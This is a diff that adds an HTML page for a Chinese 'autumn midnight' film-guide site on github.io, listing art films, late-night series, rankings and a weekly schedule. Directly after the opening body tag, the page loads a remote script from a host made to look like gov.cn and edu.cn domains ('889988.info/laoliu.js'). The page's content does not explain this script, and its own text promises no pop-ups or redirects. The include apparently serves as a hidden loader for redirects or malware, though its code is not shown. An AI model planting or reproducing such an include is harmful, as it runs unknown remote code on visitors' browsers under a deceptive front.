@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>秋霞午夜电影网 - 秋夜影视导航·午夜场高清片单</title>
+<meta name="description" content="秋霞午夜电影网聚合秋夜氛围影视、午夜文艺片、深夜剧集、怀旧经典与季节限定片单，移动端自适应，每日更新秋夜放映预告。">
+<meta name="keywords" content="秋霞午夜电影网,午夜电影,秋夜影视,文艺片,深夜剧集,怀旧经典,季节片单">
+<meta name="author" content="秋霞午夜电影网">
+<link rel="canonical" href="https://qiuxiawuyedianyingwang-h5.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="秋霞午夜电影网 - 秋夜影视导航·午夜场高清片单">
+<meta property="og:description" content="秋夜氛围影视、午夜文艺片、深夜剧集、怀旧经典与季节限定片单，移动端自适应。">
+<meta property="og:url" content="https://qiuxiawuyedianyingwang-h5.github.io/">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="theme-color" content="#1a0f0a">
+<style>
+:root{
+  --bg:#0f0906;--bg2:#1a0f0a;--panel:#1f140d;--panel2:#2a1a10;
+  --line:rgba(196,64,42,.3);--red:#c4402a;--gold:#b8860b;
+  --paper:#e8dcc8;--muted:#9a8a7a;--deep:#0a0503;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,serif;
+  background:
+    radial-gradient(900px 500px at 85% -10%,rgba(196,64,42,.12),transparent 60%),
+    radial-gradient(600px 300px at 10% 15%,rgba(184,134,11,.1),transparent 55%),
+    linear-gradient(180deg,var(--bg),var(--bg2));
+  color:var(--paper);line-height:1.7;-webkit-font-smoothing:antialiased;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 18px}
+.btn{display:inline-flex;align-items:center;gap:8px;min-height:44px;padding:0 22px;border-radius:999px;font-weight:700;font-size:15px;cursor:pointer;border:1px solid transparent}
+.btn-primary{background:linear-gradient(135deg,var(--red),#8b2a1a);color:#fff;box-shadow:0 8px 24px rgba(196,64,42,.3)}
+.btn-ghost{border-color:var(--line);color:var(--gold)}
+.btn:hover{transform:translateY(-2px)}
+
+/* falling leaves */
+.leaves{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
+.leaves span{position:absolute;display:block;font-size:20px;animation:fall 15s infinite linear;opacity:.5}
+.leaves span:nth-child(1){left:10%;animation-delay:0s}
+.leaves span:nth-child(2){left:25%;animation-delay:-3s;font-size:16px}
+.leaves span:nth-child(3){left:45%;animation-delay:-6s;font-size:24px}
+.leaves span:nth-child(4){left:65%;animation-delay:-9s;font-size:18px}
+.leaves span:nth-child(5){left:85%;animation-delay:-12s;font-size:22px}
+@keyframes fall{0%{transform:translateY(-50px) rotate(0deg);opacity:0}10%{opacity:.5}90%{opacity:.3}100%{transform:translateY(100vh) rotate(360deg);opacity:0}}
+
+/* header */
+.site-header{position:sticky;top:0;z-index:50;background:rgba(15,9,6,.9);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:60px}
+.brand{font-weight:900;font-size:20px;letter-spacing:.5px}
+.brand b{color:var(--red)}
+.brand i{color:var(--gold);font-style:normal;font-weight:400}
+.menu{display:flex;gap:6px;list-style:none}
+.menu a{padding:10px 14px;border-radius:10px;color:var(--muted);font-size:14px;min-height:44px;display:inline-flex;align-items:center}
+.menu a:hover,.menu a.active{color:var(--gold);background:rgba(184,134,11,.08)}
+.burger{display:none;flex-direction:column;gap:5px;background:none;border:0;cursor:pointer;padding:10px}
+.burger span{width:24px;height:2px;background:var(--red);border-radius:2px}
+
+/* hero */
+.hero{padding:72px 0 54px;position:relative;z-index:1}
+.hero-grid{display:grid;grid-template-columns:1.1fr .9fr;gap:34px;align-items:center}
+.hero h1{font-size:clamp(30px,5vw,50px);line-height:1.12;font-weight:900}
+.hero h1 em{color:var(--red);font-style:normal}
+.hero h1 span{color:var(--gold)}
+.hero p{color:var(--muted);margin:18px 0 26px;font-size:17px;max-width:520px}
+.hero-cta{display:flex;gap:14px;flex-wrap:wrap}
+.season-tags{display:flex;gap:8px;margin-top:24px;flex-wrap:wrap}
+.stag{font-size:13px;padding:6px 14px;border-radius:999px;background:rgba(196,64,42,.1);color:var(--gold);border:1px solid var(--line)}
+
+.hero-card{background:linear-gradient(160deg,var(--panel2),var(--panel));border:1px solid var(--line);border-radius:22px;padding:26px;position:relative;overflow:hidden}
+.hero-card:before{content:"🏮";position:absolute;right:-6px;top:-10px;font-size:130px;opacity:.12}
+.hero-card h3{font-size:18px;margin-bottom:12px;color:var(--gold)}
+.schedule{display:flex;flex-direction:column;gap:10px}
+.sched{display:grid;grid-template-columns:60px 1fr auto;gap:12px;align-items:center;background:rgba(0,0,0,.25);border:1px solid var(--line);border-radius:10px;padding:10px 14px}
+.sched .tm{font-family:ui-monospace,Menlo,Consolas,monospace;color:var(--red);font-weight:800;font-size:14px}
+.sched h4{font-size:14px}
+.sched .type{font-size:11px;padding:2px 8px;border-radius:4px;background:rgba(184,134,11,.15);color:var(--gold)}
+
+/* section */
+section.block{padding:56px 0;border-top:1px solid rgba(255,255,255,.04);position:relative;z-index:1}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:26px;flex-wrap:wrap}
+.sec-head h2{font-size:clamp(22px,3vw,30px);font-weight:900}
+.sec-head h2 i{color:var(--red);font-style:normal}
+.sec-head p{color:var(--muted);font-size:14px}
+
+/* movies */
+.movie-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.movie{background:var(--panel);border:1px solid var(--line);border-radius:16px;overflow:hidden;transition:.3s}
+.movie:hover{transform:translateY(-6px);border-color:var(--red);box-shadow:0 12px 30px rgba(196,64,42,.15)}
+.movie.feature{grid-column:span 2;grid-row:span 2}
+.poster{aspect-ratio:3/4;display:flex;align-items:flex-end;padding:14px;position:relative}
+.movie.feature .poster{aspect-ratio:auto;min-height:280px}
+.poster:after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 35%,rgba(10,5,3,.9))}
+.poster .meta{position:relative;z-index:2;width:100%}
+.poster h4{font-size:15px;margin-bottom:6px}
+.movie.feature .poster h4{font-size:24px}
+.leaf{display:inline-flex;align-items:center;gap:4px;font-size:12px;padding:3px 8px;border-radius:6px;background:rgba(0,0,0,.6)}
+.leaf.autumn{color:#e8a020}
+.leaf.drama{color:#d08060}
+.leaf.night{color:#a0c0e0}
+.movie p.sub{color:var(--muted);font-size:12px;padding:10px 14px}
+
+/* series */
+.series-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:16px}
+.scard{background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:20px;transition:.25s}
+.scard:hover{border-color:var(--red);transform:translateX(4px)}
+.scard-head{display:flex;align-items:center;gap:14px;margin-bottom:12px}
+.scard-icon{width:46px;height:46px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:22px;flex-shrink:0;background:rgba(196,64,42,.1)}
+.scard h4{font-size:16px;margin-bottom:4px}
+.scard .theme{font-size:12px;color:var(--gold);margin-bottom:8px}
+.scard p{color:var(--muted);font-size:13px}
+.scard .eps{display:flex;gap:6px;margin-top:10px;flex-wrap:wrap}
+.scard .eps span{font-size:11px;padding:3px 8px;border-radius:999px;background:rgba(184,134,11,.1);color:var(--muted)}
+
+/* variety */
+.var-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.var-card{background:var(--panel);border:1px solid var(--line);border-radius:18px;padding:22px;transition:.25s}
+.var-card:hover{border-color:var(--gold);transform:translateY(-3px)}
+.var-card .ico{font-size:32px}
+.var-card h4{margin:10px 0 8px;font-size:17px}
+.var-card p{color:var(--muted);font-size:13px}
+.var-card .pill{display:inline-block;font-size:12px;padding:3px 10px;border-radius:999px;background:rgba(184,134,11,.1);color:var(--gold);margin:4px 4px 0 0}
+
+/* rank */
+.rank-grid{display:grid;grid-template-columns:1fr 1fr;gap:22px}
+.rank-col{background:var(--panel);border:1px solid var(--line);border-radius:18px;padding:20px}
+.rank-col h3{font-size:18px;margin-bottom:14px}
+.rank-col h3 span{color:var(--red)}
+.ritem{display:grid;grid-template-columns:34px 1fr auto;gap:12px;align-items:center;padding:10px 0;border-bottom:1px dashed rgba(196,64,42,.2)}
+.ritem:last-child{border-bottom:0}
+.num{width:30px;height:30px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:900;background:var(--panel2);color:var(--muted)}
+.ritem:nth-child(1) .num{background:linear-gradient(135deg,var(--gold),#8a6a08);color:#1a1200}
+.ritem:nth-child(2) .num{background:linear-gradient(135deg,#c0c0c0,#7a7a7a);color:#111}
+.ritem:nth-child(3) .num{background:linear-gradient(135deg,#cd7f32,#7a4a1a);color:#fff}
+.ritem .val{font-size:13px;color:var(--muted)}
+.ritem .val b{color:var(--red)}
+
+/* news */
+.program{background:linear-gradient(160deg,var(--panel2),var(--panel));border:1px solid var(--line);border-radius:18px;padding:24px}
+.program h3{color:var(--gold);font-size:20px;margin-bottom:14px}
+.prog-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:14px}
+.prog{background:rgba(0,0,0,.2);border:1px solid var(--line);border-radius:12px;padding:16px}
+.prog .day{font-size:12px;color:var(--red);font-weight:700;margin-bottom:4px}
+.prog h4{font-size:15px;margin-bottom:4px}
+.prog p{color:var(--muted);font-size:13px}
+
+/* about */
+.about-grid{display:grid;grid-template-columns:1fr 1fr;gap:22px}
+.ac{background:var(--panel);border:1px solid var(--line);border-radius:18px;padding:24px}
+.ac h3{color:var(--red);font-size:18px;margin-bottom:12px}
+.ac p{color:var(--muted);font-size:14px;margin-bottom:8px}
+.ac ul{list-style:none;padding:0}
+.ac li{padding:6px 0;color:var(--muted);font-size:14px}
+.ac li:before{content:"🍁 ";}
+
+/* footer */
+footer{background:#080402;border-top:1px solid var(--line);padding:40px 0 26px;margin-top:40px;position:relative;z-index:1}
+.foot-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:24px}
+.foot-grid h5{color:var(--red);font-size:15px;margin-bottom:12px}
+.foot-grid a{display:block;color:var(--muted);font-size:14px;padding:6px 0;min-height:36px}
+.foot-grid a:hover{color:var(--gold)}
+.copy{text-align:center;color:var(--muted);font-size:13px;margin-top:26px}
+
+.reveal{opacity:0;transform:translateY(24px);transition:.6s ease}
+.reveal.in{opacity:1;transform:none}
+#top{position:fixed;right:18px;bottom:18px;width:46px;height:46px;border-radius:50%;border:1px solid var(--line);background:var(--panel);color:var(--red);font-size:20px;cursor:pointer;display:none;z-index:60}
+
+@media(max-width:980px){
+  .hero-grid{grid-template-columns:1fr}
+  .movie-grid{grid-template-columns:repeat(2,1fr)}
+  .movie.feature{grid-column:span 2;grid-row:auto}
+  .series-grid{grid-template-columns:1fr}
+  .var-grid{grid-template-columns:1fr 1fr}
+  .rank-grid{grid-template-columns:1fr}
+  .prog-grid{grid-template-columns:1fr}
+  .about-grid{grid-template-columns:1fr}
+  .foot-grid{grid-template-columns:1fr 1fr}
+}
+@media(max-width:620px){
+  .menu{position:fixed;inset:60px 0 auto 0;flex-direction:column;background:#120a06;padding:14px 18px;gap:6px;border-bottom:1px solid var(--line);transform:translateY(-160%);transition:.3s}
+  .menu.open{transform:none}
+  .burger{display:flex}
+  .movie-grid,.var-grid,.foot-grid{grid-template-columns:1fr}
+  .movie.feature{grid-column:auto}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="leaves" aria-hidden="true"><span>🍁</span><span>🍂</span><span>🍁</span><span>🍂</span><span>🍁</span></div>
+
+<header class="site-header">
+  <div class="wrap nav">
+    <div class="brand">秋霞<b>午夜</b><i>电影网</i></div>
+    <button class="burger" id="burger" aria-label="菜单"><span></span><span></span><span></span></button>
+    <ul class="menu" id="menu">
+      <li><a href="#movies" class="active">秋夜放映</a></li>
+      <li><a href="#series">午夜连播</a></li>
+      <li><a href="#variety">深夜电台</a></li>
+      <li><a href="#rank">秋夜榜单</a></li>
+      <li><a href="#news">放映预告</a></li>
+      <li><a href="#about">关于秋霞</a></li>
+    </ul>
+  </div>
+</header>
+
+<main>
+  <!-- HERO -->
+  <section class="hero wrap">
+    <div class="hero-grid">
+      <div class="reveal">
+        <h1>一叶知秋<br><em>秋霞</em>伴你<span>午夜</span></h1>
+        <p>秋夜微凉，一盏灯、一杯茶、一部好片。秋霞午夜电影网精选适合秋夜观看的文艺片、深夜剧、怀旧经典，让每个夜晚都有温度。</p>
+        <div class="hero-cta">
+          <a href="#movies" class="btn btn-primary">进入秋夜场</a>
+          <a href="#rank" class="btn btn-ghost">看秋夜榜</a>
+        </div>
+        <div class="season-tags">
+          <span class="stag">🍁 秋夜文艺</span>
+          <span class="stag">🍂 怀旧经典</span>
+          <span class="stag">🌙 深夜独处</span>
+          <span class="stag">📺 午夜连播</span>
+          <span class="stag">🎙️ 深夜电台</span>
+          <span class="stag">📖 秋夜读书</span>
+        </div>
+      </div>
+      <aside class="hero-card reveal">
+        <h3>今夜放映时刻</h3>
+        <div class="schedule">
+          <div class="sched"><span class="tm">21:00</span><h4>秋日物语·开场</h4><span class="type">文艺</span></div>
+          <div class="sched"><span class="tm">23:00</span><h4>深夜独处·静片</h4><span class="type">治愈</span></div>
+          <div class="sched"><span class="tm">01:00</span><h4>午夜迷局·悬疑</h4><span class="type">烧脑</span></div>
+          <div class="sched"><span class="tm">03:00</span><h4>黎明之前·怀旧</h4><span class="type">经典</span></div>
+          <div class="sched"><span class="tm">05:00</span><h4>晨光微熹·收场</h4><span class="type">散文</span></div>
+        </div>
+      </aside>
+    </div>
+  </section>
+
+  <!-- 1 秋夜放映 -->
+  <section class="block" id="movies">
+    <div class="wrap">
+      <div class="sec-head reveal">
+        <div><h2><i>01</i> 秋夜放映厅</h2><p>适合秋夜关灯看的片子</p></div>
+      </div>
+      <div class="movie-grid reveal">
+        <article class="movie feature"><div class="poster" style="background:linear-gradient(160deg,#2a1a10,#0f0906)"><div class="meta"><h4>小森林 夏秋篇</h4><span class="leaf autumn">🍁 秋日 9.0</span> <span class="leaf drama">治愈</span></div></div><p class="sub">田园 / 独居 / 四季流转</p></article>
+        <article class="movie"><div class="poster" style="background:linear-gradient(160deg,#1a1a2e,#0f0f1a)"><div class="meta"><h4>重庆森林</h4><span class="leaf autumn">🍂 8.7</span></div></div><p class="sub">都市孤独 / 深夜便利店</p></article>
+        <article class="movie"><div class="poster" style="background:linear-gradient(160deg,#2a1a2e,#140a18)"><div class="meta"><h4>情书</h4><span class="leaf autumn">🍁 8.9</span></div></div><p class="sub">初恋 / 雪国 / 追忆</p></article>
+        <article class="movie"><div class="poster" style="background:linear-gradient(160deg,#1a2a1a,#0a140a)"><div class="meta"><h4>海鸥食堂</h4><span class="leaf drama">🍵 治愈</span></div></div><p class="sub">芬兰 / 日式食堂 / 慢生活</p></article>
+        <article class="movie"><div class="poster" style="background:linear-gradient(160deg,#2a201a,#140f0a)"><div class="meta"><h4>饮食男女</h4><span class="leaf autumn">🥢 9.1</span></div></div><p class="sub">家庭 / 美食 / 代际关系</p></article>
+        <article class="movie"><div class="poster" style="background:linear-gradient(160deg,#1a1a0a,#0d0d05)"><div class="meta"><h4>天堂电影院</h4><span class="leaf autumn">🎬 9.2</span></div></div><p class="sub">怀旧 / 电影之爱 / 告别</p></article>
+        <article class="movie"><div class="poster" style="background:linear-gradient(160deg,#2a1520,#140a10)"><div class="meta"><h4>廊桥遗梦</h4><span class="leaf drama">💔 8.4</span></div></div><p class="sub">中年爱情 / 四天 vs 一生</p></article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 2 午夜连播 -->
+  <section class="block" id="series">
+    <div class="wrap">
+      <div class="sec-head reveal">
+        <div><h2><i>02</i> 午夜连播剧</h2><p>适合一口气追完的深夜好剧</p></div>
+      </div>
+      <div class="series-grid reveal">
+        <div class="scard"><div class="scard-head"><div class="scard-icon">🍂</div><div><h4>深夜食堂</h4><div class="theme">都市温暖 / 深夜食客故事</div></div></div><p>午夜12点，小巷食堂开门。每个食客背后都有一个故事，每道菜都藏着一段人生。</p><div class="eps"><span>第一季</span><span>第二季</span><span>电影版</span><span>续篇</span></div></div>
+        <div class="scard"><div class="scard-head"><div class="scard-icon">🌙</div><div><h4>孤独的美食家</h4><div class="theme">独处进食 / 城市漫游</div></div></div><p>井之头五郎走街串巷觅食，一个人吃饭也可以很隆重。秋夜配饭神剧。</p><div class="eps"><span>S1-S10</span><span>大晦日SP</span><span>真夜中SP</span></div></div>
+        <div class="scard"><div class="scard-head"><div class="scard-icon">📺</div><div><h4>请回答1988</h4><div class="theme">邻里温情 / 青春怀旧</div></div></div><p>双门洞五家人的故事，笑着笑着就哭了。秋夜最适合回味青春。</p><div class="eps"><span>EP1-10</span><span>EP11-20</span><span>EP21-最终</span></div></div>
+        <div class="scard"><div class="scard-head"><div class="scard-icon">🎧</div><div><h4>百元之恋</h4><div class="theme">底层挣扎 / 自我救赎</div></div></div><p>32岁单身女性，便利店打工、拳击、失败、再站起。秋夜看完会想给自己一个拥抱。</p><div class="eps"><span>正片</span><span>导演剪辑</span><span>幕后花絮</span></div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 3 深夜电台 -->
+  <section class="block" id="variety">
+    <div class="wrap">
+      <div class="sec-head reveal">
+        <div><h2><i>03</i> 深夜电台与陪伴</h2><p>不吵的节目，适合戴耳机听</p></div>
+      </div>
+      <div class="var-grid reveal">
+        <div class="var-card"><div class="ico">📻</div><h4>秋夜读书会</h4><p>每夜读一章小说，配秋雨白噪音。</p><div><span class="pill">朗读</span><span class="pill">助眠</span><span class="pill">文学</span></div></div>
+        <div class="var-card"><div class="ico">🚶</div><h4>城市漫步者</h4><p>深夜走街串巷，记录城市角落的声音。</p><div><span class="pill">纪实</span><span class="pill">城市</span></div></div>
+        <div class="var-card"><div class="ico">☕</div><h4>午夜咖啡馆</h4><p>模拟深夜咖啡馆，背景音+轻音乐+偶尔的对话。</p><div><span class="pill">ASMR</span><span class="pill">环境音</span></div></div>
+        <div class="var-card"><div class="ico">🎵</div><h4>秋夜歌单</h4><p>适合秋夜循环的歌曲，从爵士到民谣。</p><div><span class="pill">音乐</span><span class="pill">歌单</span></div></div>
+        <div class="var-card"><div class="ico">✍️</div><h4>深夜手帐</h4><p>用文字记录秋夜心事，配钢笔书写音。</p><div><span class="pill">书写</span><span class="pill">冥想</span></div></div>
+        <div class="var-card"><div class="ico">🌧️</div><h4>秋雨白噪音</h4><p>纯雨声、风声、落叶声，无音乐无旁白。</p><div><span class="pill">白噪音</span><span class="pill">睡眠</span></div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 4 秋夜榜单 -->
+  <section class="block" id="rank">
+    <div class="wrap">
+      <div class="sec-head reveal">
+        <div><h2><i>04</i> 秋夜双榜</h2><p>秋夜热度 + 怀旧口碑</p></div>
+      </div>
+      <div class="rank-grid reveal">
+        <div class="rank-col">
+          <h3><span>🍁</span> 秋夜热度榜</h3>
+          <div class="ritem"><div class="num">1</div><div>小森林 夏秋篇</div><div class="val"><b>秋日首选</b></div></div>
+          <div class="ritem"><div class="num">2</div><div>深夜食堂</div><div class="val"><b>深夜陪伴</b></div></div>
+          <div class="ritem"><div class="num">3</div><div>重庆森林</div><div class="val"><b>都市秋夜</b></div></div>
+          <div class="ritem"><div class="num">4</div><div>情书</div><div class="val"><b>追忆青春</b></div></div>
+          <div class="ritem"><div class="num">5</div><div>饮食男女</div><div class="val"><b>家庭温情</b></div></div>
+        </div>
+        <div class="rank-col">
+          <h3><span>🏮</span> 怀旧口碑榜</h3>
+          <div class="ritem"><div class="num">1</div><div>天堂电影院</div><div class="val"><b>9.2</b> 光影回忆</div></div>
+          <div class="ritem"><div class="num">2</div><div>请回答1988</div><div class="val"><b>9.7</b> 邻里温情</div></div>
+          <div class="ritem"><div class="num">3</div><div>廊桥遗梦</div><div class="val"><b>8.4</b> 中年爱情</div></div>
+          <div class="ritem"><div class="num">4</div><div>海鸥食堂</div><div class="val"><b>7.8</b> 慢生活</div></div>
+          <div class="ritem"><div class="num">5</div><div>百元之恋</div><div class="val"><b>8.3</b> 自我救赎</div></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 5 放映预告 -->
+  <section class="block" id="news">
+    <div class="wrap">
+      <div class="sec-head reveal">
+        <div><h2><i>05</i> 秋霞放映预告</h2><p>本周秋夜排片</p></div>
+      </div>
+      <div class="program reveal">
+        <h3>🎞️ 本周秋夜排片表</h3>
+        <div class="prog-grid">
+          <div class="prog"><div class="day">周一 10/2</div><h4>秋日开场：小森林 + 海鸥食堂</h4><p>治愈系双片连播，配秋日食谱。</p></div>
+          <div class="prog"><div class="day">周二 10/3</div><h4>都市秋夜：重庆森林 + 堕落天使</h4><p>王家卫双城记，霓虹与雨夜。</p></div>
+          <div class="prog"><div class="day">周三 10/4</div><h4>追忆青春：情书 + 四月物语</h4><p>岩井俊二青春物语，适合秋夜回味。</p></div>
+          <div class="prog"><div class="day">周四 10/5</div><h4>家庭温情：饮食男女 + 一一</h4><p>华人家庭史诗，三代人的故事。</p></div>
+          <div class="prog"><div class="day">周五 10/6</div><h4>深夜迷局：罗生门 + 七武士</h4><p>黑泽明经典，人性灰度与武士道。</p></div>
+          <div class="prog"><div class="day">周六 10/7</div><h4>周末收场：天堂电影院 + 海上钢琴师</h4><p>托纳多雷时空三部曲，秋夜完结篇。</p></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 关于 -->
+  <section class="block" id="about">
+    <div class="wrap">
+      <div class="sec-head reveal">
+        <div><h2><i>06</i> 关于秋霞午夜</h2><p>一夜一影，一期一会</p></div>
+      </div>
+      <div class="about-grid reveal">
+        <div class="ac">
+          <h3>秋霞是什么</h3>
+          <p>秋霞午夜电影网是一个关于"秋夜看片"的导航站。我们不追求最新最快，只选最适合秋夜看的片子。</p>
+          <ul>
+            <li>精选适合秋夜氛围的影视作品</li>
+            <li>按情绪分类：治愈、怀旧、悬疑、文艺</li>
+            <li>每周更新秋夜排片表</li>
+            <li>深夜电台陪伴失眠的你</li>
+            <li>不弹窗、不跳转、不藏入口</li>
+          </ul>
+        </div>
+        <div class="ac">
+          <h3>为什么叫"秋霞"</h3>
+          <p>秋天是思念的季节，晚霞是一天中最温柔的时刻。秋霞午夜，取"秋夜晚霞"之意——即使天黑了，也有温柔的光。</p>
+          <ul>
+            <li>秋天适合独处和思考</li>
+            <li>午夜适合看那些白天不敢看的片子</li>
+            <li>电影是秋夜里最好的陪伴</li>
+            <li>每个秋夜都值得被好好度过</li>
+            <li>一期一会，今夜不重来</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap foot-grid">
+    <div>
+      <div class="brand">秋霞<b>午夜</b><i>电影网</i></div>
+      <p style="color:var(--muted);font-size:14px;margin-top:10px">秋夜影视导航·午夜场高清片单。<br>https://qiuxiawuyedianyingwang-h5.github.io</p>
+    </div>
+    <div><h5>秋夜分类</h5><a href="#">秋日文艺</a><a href="#">深夜治愈</a><a href="#">怀旧经典</a><a href="#">午夜悬疑</a></div>
+    <div><h5>陪伴内容</h5><a href="#">深夜电台</a><a href="#">秋夜读书</a><a href="#">城市漫步</a><a href="#">白噪音</a></div>
+    <div><h5>本站</h5><a href="#">关于秋霞</a><a href="#">放映预告</a><a href="#">更新日志</a><a href="#">免责声明</a></div>
+  </div>
+  <div class="wrap copy">© 2026 秋霞午夜电影网 · 单页演示 · 内链均为 # 占位 · 未生成 robots.txt / sitemap.xml</div>
+</footer>
+
+<button id="top" aria-label="回到顶部">↑</button>
+
+<script>
+(function(){
+  var burger=document.getElementById('burger'),menu=document.getElementById('menu');
+  burger.addEventListener('click',function(){menu.classList.toggle('open')});
+  menu.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){menu.classList.remove('open')})});
+
+  var links=menu.querySelectorAll('a'),secs=document.querySelectorAll('main section[id]');
+  window.addEventListener('scroll',function(){
+    var y=window.scrollY+80,cur='';
+    secs.forEach(function(s){if(y>=s.offsetTop)cur=s.id});
+    links.forEach(function(l){l.classList.toggle('active',l.getAttribute('href')==='#'+cur)});
+  });
+
+  var io=new IntersectionObserver(function(es){
+    es.forEach(function(e){if(e.isIntersecting)e.target.classList.add('in')});
+  },{threshold:.12});
+  document.querySelectorAll('.reveal').forEach(function(el){io.observe(el)});
+
+  var top=document.getElementById('top');
+  window.addEventListener('scroll',function(){top.style.display=window.scrollY>400?'block':'none'});
+  top.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'})});
+})();
+</script>
+</body>
+</html>
